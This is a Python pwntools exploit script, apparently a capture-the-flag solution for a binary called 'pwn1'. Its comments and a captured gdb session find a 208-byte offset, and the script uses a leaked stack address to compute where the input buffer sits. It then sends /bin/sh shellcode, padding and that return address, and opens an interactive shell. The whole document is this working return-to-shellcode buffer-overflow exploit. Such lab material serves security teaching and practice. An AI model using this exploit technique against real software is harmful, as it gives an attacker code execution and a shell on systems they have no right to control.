#!/usr/bin/env python3

# Stack based buffer overflow - return to shellcode

from pwn import *

elf = ELF("./pwn1")

if args.LOCAL: # run with python3 sol.py LOCAL
  p = process(elf.path)
else:
  p = remote("localhost", 9001)

# use `pwn cyclic 250`, feed into needle, then feed the crashed eip address into `pwn cyclic -l <address>`
"""
root@e6368c853402:/opt/pwn1# pwn cyclic 250
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma
root@e6368c853402:/opt/pwn1# gdb -q pwn1
Reading symbols from pwn1...
(gdb) run
Starting program: /opt/pwn1/pwn1
Enter the string to search within:
anything
Debug: the address of haystack is: ffac2d1c
Enter the substring to search for:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma
Substring not found!

Program received signal SIGSEGV, Segmentation fault.
0x63616163 in ?? ()
(gdb) quit
A debugging session is active.

	Inferior 1 [process 40] will be killed.

Quit anyway? (y or n) y
root@e6368c853402:/opt/pwn1# pwn cyclic -l 0x63616163
208
"""
offset = 208

p.recvuntil("within:\n")
p.sendline("anything") # this will be overwritten by our overflow on needle

# receive haystack address
p.recvuntil("haystack is: ")
address_of_haystack = int(p.recvline().decode("utf-8").strip(), 16) # convert hex characters to number
log.info(f"Address of haystack is {hex(address_of_haystack)}")

# now we know the address of haystack within memory, we can calculate the address of needle by simply subtracting the length of needle (64)!
address_of_needle = address_of_haystack - 64
log.info(f"Address of needle is {hex(address_of_needle)}")

# since the Non Executable (NX) bit is disabled, we can insert shellcode onto the stack and jump to it
# generate a basic 32 bit /bin/sh shellcode
shellcode = asm(shellcraft.i386.linux.sh())

p.recvuntil("for:\n")

# payload = SHELLCODE + JUNK + ADDRESS OF SHELLCODE
p.sendline(shellcode + b"A" * (offset - len(shellcode)) + p32(address_of_needle))
p.interactive()